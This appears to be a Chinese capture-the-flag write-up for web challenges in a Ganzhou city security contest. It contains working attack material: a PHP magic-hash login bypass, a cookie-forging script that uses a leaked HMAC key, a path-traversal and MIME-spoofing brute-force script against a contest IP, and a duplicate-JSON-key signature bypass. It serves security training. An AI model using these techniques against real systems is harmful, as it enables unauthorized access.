---
title: 赣州市第三届“虔城杯”网络安全技能大赛初赛--WriteUp
url: https://mp.weixin.qq.com/s/E2yy9AYpMV5M_LuQbx5cvA
source: Doonsec's feed
date: 2026-06-16
fetch_date: 2026-06-17T07:00:17.153141
---

# 赣州市第三届“虔城杯”网络安全技能大赛初赛--WriteUp

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/vLMlSnKFO8UY1mw73tnsnwiazFY3LxolUjYIQMBOKd8YUuibcxekagxuEQIfWv2ibUWQtlZEibMBFlK8Tu9Mib7nW5LHvogiaoicvI527yibhPd2hzQ/0?wx_fmt=jpeg)

# 赣州市第三届“虔城杯”网络安全技能大赛初赛--WriteUp

原创

Undefin3d团队
Undefin3d团队

Undefin3d安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

Web

php magic

访问 robots.txt发现：Disallow: /backup/ Disallow: /dev-note.txt

读取/dev-note.txt，提示源码备份：旧的源码备份放在/backup/login.php.bak

```
<?php
$username=isset($_POST['username'])?trim($_POST['username']):'';
$password=isset($_POST['password'])?$_POST['password']:'';
if($username=='admin'&&md5($password)=='0e462097431906509019562988736854') {
    $flag=getenv('FLAG')?:'flag{fake_flag}';
    header('Content-Type: text/plain; charset=utf-8');
    echo"Welcome, admin.\n";
    echo$flag."\n";
    exit;
}
header('Location: /?error='.rawurlencode('用户名或密码错误'));
exit;
```

php弱类型绕过

240610708的 MD5为：0e462097431906509019562988736854

登录得到flag

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8WS7x3TqHs14ErrOldFEWSdxAHAnkLKsQG7biaVA1Gm25DM3obvjOmFLF5JVJXxTBOdKGvomaBnRuib44uDH7cClt11L11IIwcec/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

First Gate

使用 guest账户登录

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8VziaPJzOXERpMMd0gh1zXkwDqHXsmFMzn36ABqpEf1Tq8ib5hwDuhOLRhSOg1C8jUVcmJDaosgyxj6HrwDcJ2HuH0sSJsoyr7s0/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

对 cookie进行解密

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8XVetFTe5b2tZDFIg5TsJuxnhjSwWY8Wxm1SyF1d2wxaJVL5fLZSteW6WNTB6v8HR7kfMbe1YBoibNXUjUme4HjjUKLAGkb8cS8/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

复现是类似于jwt格式

在 robots.txt中发现 .wall-known

/.well-known/是标准目录，常见文件包括security.txt。

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8WtJicG8pY2Mv3TibawMlXuQBfn2OxeKt2l17icsYjGdswwicibAnvwe6lJnvaT3Ehc9bApqW7kgT44mqvUUkG7TZzoAhBx64kvwAs8/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

打开/backup/config.php.bak

```
<?php
// Old beta config. The ops team said this file is no longer used.
$SIGNING_KEY='dev_key_do_not_commit_2026';
$COOKIE_NAME='FG_AUTH';
$TOKEN_FORMAT='base64url(json_payload).hmac_sha256(payload, SIGNING_KEY)';
$USERS=['guest'=>'guest123',];
```

泄露了签名密钥：

`dev*key*do*not*commit\_2026`

同时确认签名算法为：

`hmac*sha256(payload, SIGNING*KEY)`

构造管理员payload：

```
{"uid":1,"name":"admin","role":"admin","exp":1781581602}
```

使用泄露的密钥计算签名：

```
import base64
import json
import hmac
import hashlib
import time

key = b'dev_key_do_not_commit_2026'
payload = {'uid':1,'name':'admin','role':'admin','exp':int(time.time())+3600}
raw = json.dumps(payload, separators=(',',':'))
b64 = base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')
sig = hmac.new(key, b64.encode(), hashlib.sha256).hexdigest()
cookie = f'{b64}.{sig}'
print(cookie)
```

输出：

`eyJ1aWQiOjEsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc4MTU5OTYxMX0.a42481114049b0ff97c8254c65d842237fe8092d7581a05330bbc91218d53d6b`

带伪造 Cookie访问后台得到flag

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8WgIwIOFMq9r8rWODsjZDp7Id2WB2XfHTccqP3qf2rDu7NK1icYIlOicxvHexTHwR8ROgF2E47XaKt2icDib7V4pSPL6xAvor7XfGM/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

GoodMusic

打开题目发现 php源码，flag在session里面

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8Whl4COy4veGJroR2I1MG2icqBhUGn4f80rLVcGH6F1fPlUVA6ysLohavAroRtjNcyiaC9gMcqmWWxLY0jsts9oKf1tSxUSSdXK4/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

访问111.74.9.131:18070/listening.php得到一段音频

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8WUILILic778RLDuDTv6Q8JGpicia9yoqcTAfOPZHCXcp4DCWeicFr27zMbdyZqZMZ6jg7yUWgu63QVBrph4Wjic5O1yIsYN4hvAS5U/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

使用 POST请求得到源码

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8W0fhPY4b0QtewibkjCRoKNReDJ65O9WwebGpcOhEEaicwFGp4MImYJUQE9SVA7nJJv6vIrBWMAYGjoU4BoHdVXYUPhGfOOt8C6I/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

```
<?php
if($_SERVER['REQUEST_METHOD']==='POST'){
    highlight_file(__FILE__);
}
if(!isset($_GET['file'])){
    $file='1.mp3';
}else{
    $file='/var/www/html/'.$_GET['file'];
}
if(!file_exists($file)) {
    http_response_code(404);
    die;
}
$mime = mime_content_type($file);
if(!$mime||!str_starts_with($mime,'audio')) {
    http_response_code(403);
    die;
}
header("Content-Type:$mime");
readfile($file);
?>
```

可以看到file参数存在文件读取逻辑：

`$file='/var/www/html/'.$\_GET['file'];`

由于没有过滤`../`，所以可以目录穿越读取文件，例如：

`/listening.php?file=../../../../tmp/sess\_<PHPSESSID>`

但是源码中还有 MIME检查：

```
$mime = mime_content_type($file);
if(!$mime||!str_starts_with($mime,'audio')) {
    http_response_code(403);
    die;
}
```

普通 session文件不是音频文件，因此直接读 session会返回 403。

PHP默认文件 session的内容格式类似：

`flag|s:28:"flag{...}";music|s::"";`

其中：

* flag是服务端写入的，不可控。

* music来自`$\_GET['music']`，完全可控。

因此我们可以通过首页参数：

`/?music=<payload>`

控制 session文件的一部分内容。

目标是让整个 session文件通过：

`mime*content*type($file)`

并且结果以`audio`开头

`mime*content*type()`底层通常依赖libmagic识别文件类型。

一些音频格式不是只检查文件开头，而是检查固定偏移处的 magic bytes。

ProTracker MOD文件有一个经典特征：

`M.K.`

当`M.K.`出现在文件绝对偏移1080附近时，libmagic会把文件识别为：

`audio/x-mod`

所以思路是：

1. 使用music参数往 session文件写入大量填充字符。
2. 调节填充长度，让`M.K.`正好落到 session文件偏移1080。
3. 此时 session文件会被识别为`audio/x-mod`。
4. 再通过`listening.php?file=../../../../tmp/sess\_<PHPSESSID>`读取 session文件。
5. session文件内容中包含`flag|s:...:"flag{...}"`。

解题脚本如下:

```
import requests
import re
import urllib.parse

base = "http://111.74.9.131:18070/"
for n in range(700,1150):
    music = b"A"*n + b"M.K." + b"B"*20
    q = urllib.parse.quote_from_bytes(music,safe="")
    s = requests.Session()
    s.get(base+"?music="+q,timeout=10)
    sid = s.cookies.get("PHPSESSID")
    if not sid:
        continue
    r = s.get(base+"listening.php",params={"file":"../../../../tmp/sess_"+sid},timeout=10,)
    m = re.search(r"flag\{[^}]+\}",r.text)
    if m:
        print(m.group(0))
        break
```

运行得到flag

![标题: fig: - 说明 image-20260616160017877](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8UdZ4BNAdosmDpvYEqOOfd0wYRMSk4JlMnrhr5MthicIk6Uj2EEqFnfE57rGcZdqYZMUIDCfXynYPl0b0Bly6LtbqZ2myph7ShU/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

double writeback

对源码进行审计发现，vendor/payload\_codec.py存在漏洞

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8X8icEVv5amcB0mWRnNBGKJf49mRL3PZfzjmYkLvWOo2lnicwFW6VZia5r0Q4JdDNzE3pSEwxTeW7wxZZz0K8paj8qDUcqZXhXRXE/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

`normalize*event`使用了`object*pairs*hook=*compat\_pairs`

`*compat*pairs`对重复 key取第一次出现的值

也就是说，验签时它只承认最早出现的那对字段

CHANGELOG.md也明确写了：

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8XcyqyLnexVXsxPZoyMDNAu9HTB2VJms5NWgSiaEnVicRbQRD4Yhb1LB90bj7N14jFD0l8ckDEbwvlicD8T4lPySgt0dsXMWgbg18/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

为了兼容老合作伙伴字段顺序不稳定，验签端只认第一次出现的值。

注册账户，从控制台拿到合法签名，POST/api/developer/sample返回一个沙箱订单的完整样例，包括body、headers、签名

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8X69pdmzVEZA3KYAH2bs8QXs02TvueAehrZxmYn1rMicnPFzzd38iaSkFViaLm4r4icyQ5DlN7RCpuEibg8SZR5Jdj2Z1LhtIhMRB5g/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8V0l1Ghx3uNJw0wiaQFxw4c93qDag9TelWoROV45H2OvmvquOjARe4mR5POOL9XRZ6bdIhSeibeiaoKcFbNALU1uI8LAKXkoZpCRU/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

在 resource末尾追加"重复键"

![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/vLMlSnKFO8WuicnCjs3ACT6qLvkaKeFniaAldLFsDJGxp2oFXKu6HJ1cpA60x2C7CtAVCQHl3ficxYa7bicsP9cA64Qbh2bOgicBdLKFYaw68euo/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

之后在审计报告中下载得到flag

![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/vLMlSnKFO8XqReS6dZPDR6LX46BVyYTaTGb3U0pzz11v4DETgicKCy63MgtpYMQtplib9geTicU92FIIvibTLA4xObuwcb69d2TsVvBm4QvY46Q/640?wx_fmt=png&from=appmsg)![]()![]()![]()![]()![]()![]()![]()![]()![]()

![标题: fig:](https://...